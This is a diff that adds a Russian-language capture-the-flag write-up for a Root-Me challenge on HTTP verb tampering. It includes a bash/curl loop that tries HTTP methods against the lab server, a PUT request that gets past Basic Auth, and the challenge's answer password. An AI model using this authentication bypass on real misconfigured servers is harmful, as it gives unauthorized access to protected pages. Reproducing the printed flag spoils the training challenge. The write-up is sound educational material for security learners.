@@ -1,0 +1,31 @@
+## 🚀 Задача 6. HTTP - Verb tampering
+
+**Категория:** Web-Server
+**Описание:** Страница защищена HTTP Basic Authentication (RFC 2617).
+Задача — обойти аутентификацию, не зная кредов.
+
+### 🔍 Анализ
+Системное окно входа = ответ `401` с `WWW-Authenticate: Basic`.
+Классическая ошибка конфигурации Apache — директива `<Limit GET POST>`:
+пароль требуется только для перечисленных методов, а любой другой
+«глагол» (включая выдуманные) проходит без проверки.
+
+### 💥 Эксплуатация
+1. Перебор методов (цикл + curl):
+
+```bash
+for m in GET POST HEAD PUT DELETE OPTIONS TRACE PATCH FOO BAR TEST; do
+  echo -n "--- $m: "
+  if [ "$m" = "HEAD" ]; then
+    curl -s -o /dev/null -w "%{http_code}" -I -m 3 \
+      http://challenge01.root-me.org/web-serveur/ch8/
+  else
+    curl -s -o /dev/null -w "%{http_code} %{size_download}" -X $m -m 3 \
+      http://challenge01.root-me.org/web-serveur/ch8/
+  fi
+  echo ""
+done
+Результат: GET/POST → 401, все остальные (PUT, DELETE, FOO...) → 200.
+Забираем защищённую страницу обходным методом:
+curl -i -X PUT http://challenge01.root-me.org/web-serveur/ch8/
+password : a23e$dme96d3saez$$prap
